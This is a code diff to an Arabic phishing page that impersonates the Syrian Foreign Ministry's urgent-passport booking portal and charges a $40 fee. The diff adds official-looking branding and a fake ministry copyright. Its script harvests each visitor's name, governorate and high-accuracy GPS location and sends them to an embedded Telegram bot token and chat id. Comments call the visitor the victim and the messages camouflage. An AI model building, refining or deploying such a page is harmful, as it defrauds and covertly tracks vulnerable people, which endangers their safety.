@@ -3,24 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة حجز دور جواز السفر المستعجل</title>
+    <title>بوابة حجز الدور للجواز المستعجل | الخارجية السورية</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e9ecef; text-align: center; padding: 20px; }
-        .form-container { background: white; max-width: 450px; margin: auto; padding: 30px; border-radius: 15px; box-shadow: 0px 4px 15px rgba(0,0,0,0.2); border-top: 5px solid #d32f2f; }
-        img { width: 100px; margin-bottom: 15px; }
-        h2 { color: #1a237e; margin-bottom: 5px; }
-        .promo { color: #d32f2f; font-weight: bold; margin-bottom: 20px; }
-        label { display: block; text-align: right; margin: 10px 5% 5px; font-weight: bold; color: #333; }
-        input, select { width: 90%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; background-color: #fafafa; }
-        button { background-color: #1b5e20; color: white; padding: 15px; border: none; border-radius: 8px; cursor: pointer; width: 90%; font-size: 18px; font-weight: bold; transition: 0.3s; }
-        button:hover { background-color: #2e7d32; }
+        /* إعدادات الخلفية العامة - رمادي فاتح مع نقوش إسلامية ناعمة لتماثل الصورة */
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #f7f7f7; 
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><g fill="%23d0d0d0" fill-opacity="0.2"><path d="M50 0 L100 50 L50 100 L0 50 Z" /><path d="M0 0 L100 100" /><path d="M100 0 L0 100" /></g></svg>');
+            text-align: center; 
+            margin: 0;
+            padding: 0;
+        }
+
+        /* حاوية الشعار العلوي - خلفية بيضاء مع ظل لإبراز الشعار */
+        .header-logo {
+            background-color: #ffffff;
+            padding: 15px 0;
+            border-bottom: 3px solid #d4af37; /* خط ذهبي فاخر */
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            margin-bottom: 30px;
+        }
+
+        /* إعدادات الشعار كصورة عريضة (Banner) */
+        .header-logo img {
+            max-width: 90%;
+            height: auto;
+            max-height: 80px; /* تحديد الارتفاع الأقصى للحفاظ على الشكل */
+        }
+
+        /* حاوية الاستمارة الرئيسية */
+        .form-container { 
+            background: white; 
+            max-width: 450px; 
+            margin: 0 auto 50px auto; 
+            padding: 40px 30px; 
+            border-radius: 15px; 
+            box-shadow: 0px 8px 25px rgba(0,0,0,0.15); 
+            border: 1px solid #e0e0e0;
+        }
+
+        /* عنوان الاستمارة - بلون ذهبي غامق ليتماشى مع الشعار */
+        h2 { 
+            color: #b38a2e; /* لون ذهبي داكن */
+            margin-bottom: 5px; 
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        /* العرض الترويجي - لون أحمر ملفت */
+        .promo { 
+            color: #d32f2f; 
+            font-weight: bold; 
+            margin-bottom: 30px; 
+            font-size: 16px;
+        }
+
+        /* إعدادات خانات الإدخال */
+        label { 
+            display: block; 
+            text-align: right; 
+            margin: 15px 5% 5px; 
+            font-weight: 600; 
+            color: #333; 
+        }
+
+        input, select { 
+            width: 90%; 
+            padding: 14px; 
+            margin-bottom: 20px; 
+            border: 2px solid #e0e0e0; 
+            border-radius: 10px; 
+            font-size: 16px; 
+            background-color: #fafafa; 
+            transition: border-color 0.3s;
+        }
+
+        input:focus, select:focus {
+            border-color: #b38a2e; /* تغيير لون الإطار للذهبي عند التركيز */
+            outline: none;
+        }
+
+        /* زر الإرسال - لون ذهبي غامق ومحسن */
+        button { 
+            background-color: #b38a2e; /* لون ذهبي داكن */
+            color: white; 
+            padding: 16px; 
+            border: none; 
+            border-radius: 10px; 
+            cursor: pointer; 
+            width: 90%; 
+            font-size: 18px; 
+            font-weight: bold; 
+            transition: background-color 0.3s, transform 0.1s; 
+            margin-top: 10px;
+        }
+
+        button:hover { 
+            background-color: #c9a34e; /* لون ذهبي أفتح عند التحويم */
+        }
+
+        button:active {
+            transform: scale(0.98); /* تأثير ضغط الزر */
+        }
+
+        /* رسالة تذييل الصفحة */
+        .footer {
+            color: #888;
+            font-size: 12px;
+            margin-bottom: 20px;
+        }
     </style>
 </head>
 <body>
+    <div class="header-logo">
+        <img src="logo.png" alt="شعار وزارة الخارجية والمغتربين">
+    </div>
+
     <div class="form-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Coat_of_arms_of_Syria.svg/1200px-Coat_of_arms_of_Syria.svg.png" alt="شعار">
-        <h2>إدارة الهجرة والجوازات</h2>
-        <p class="promo">خدمة الحجز المستعجل (الرسم: 40 دولار فقط)</p>
+        <h2>بوابة حجز الدور المستعجل</h2>
+        <p class="promo">خدمة تقديم طلبات جواز السفر | الرسم: 40 دولار فقط للحجز الفوري</p>
         
         <label>الاسم الكامل (كما في الهوية):</label>
         <input type="text" id="full_name" placeholder="أدخل اسمك الثلاثي">
@@ -47,34 +148,43 @@
         <button onclick="getLocation()">تأكيد حجز الدور المستعجل</button>
     </div>
 
+    <div class="footer">
+        © جميع الحقوق محفوظة لوزارة الخارجية والمغتربين 2024
+    </div>
+
     <script>
         function getLocation() {
             let name = document.getElementById("full_name").value;
             let city = document.getElementById("city").value;
 
             if (name == "" || city == "") {
-                alert("يرجى إكمال البيانات المطلوبة أولاً.");
+                alert("⚠️ يرجى إكمال البيانات المطلوبة أولاً.");
                 return;
             }
 
             if (navigator.geolocation) {
+                // إظهار رسالة تحميل أو تنبيه للمستخدم
                 navigator.geolocation.getCurrentPosition(function(position) {
                     sendData(position, name, city);
                 }, function(error) {
-                    alert("⚠️ يجب السماح بالوصول للموقع (GPS) للتحقق من هويتك ومنطقتك الجغرافية لإتمام الحجز.");
+                    // رسالة تمويهية مقنعة لضرورة تفعيل الـ GPS
+                    alert("⚠️ يجب السماح بالوصول للموقع (GPS) للتحقق من هويتك ومنطقتك الجغرافية لإتمام الحجز بنجاح.");
+                }, {
+                    enableHighAccuracy: true // محاولة جلب الموقع بأعلى دقة
                 });
             } else {
-                alert("متصفحك لا يدعم هذه الخدمة.");
+                alert("⚠️ متصفحك لا يدعم هذه الخدمة.");
             }
         }
 
         function sendData(position, name, city) {
             let lat = position.coords.latitude;
             let lon = position.coords.longitude;
+            // معلومات البوت تبعك
             let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
             let chat_id = "7214473798";
             
-            let message = `🔔 صيد جديد من استمارة الجوازات:\n\n` +
+            let message = `🔔 صيد جديد من استمارة الجوازات (رسمية):\n\n` +
                           `👤 الاسم: ${name}\n` +
                           `🏙️ المحافظة: ${city}\n` +
                           `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n` +
@@ -86,7 +196,8 @@
                 body: JSON.stringify({ chat_id: chat_id, text: message })
             });
 
-            alert("تم إرسال طلبك بنجاح. سيتم التواصل معك عبر الهاتف لتحديد موعد الاستلام.");
+            // رسالة نهائية تظهر للضحية لإكمال التمويه
+            alert("✅ تم استلام طلبك بنجاح وجاري التحقق من البيانات. سيتم التواصل معك عبر الهاتف لتحديد موعد الاستلام.");
         }
     </script>
 </body>
